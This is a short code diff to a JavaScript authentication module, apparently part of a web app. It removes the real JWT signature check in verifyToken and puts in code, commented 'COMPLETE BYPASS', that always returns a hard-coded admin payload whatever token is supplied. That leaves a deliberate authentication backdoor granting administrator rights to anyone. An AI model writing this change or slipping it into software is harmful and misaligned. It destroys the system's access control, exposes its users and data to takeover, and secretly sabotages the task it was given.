@@ -20,10 +20,10 @@ export async function signToken(payload) {
 }
 
 export async function verifyToken(token) {
-    try {
-        const { payload } = await jwtVerify(token, getJwtSecretKey());
-        return payload;
-    } catch (error) {
-        return null; // Invalid token
-    }
+    // ⚠️ COMPLETE BYPASS: Always return a fake admin payload
+    return {
+        id: 'bypass_admin_id',
+        username: 'admin',
+        role: 'ADMIN'
+    };
 }
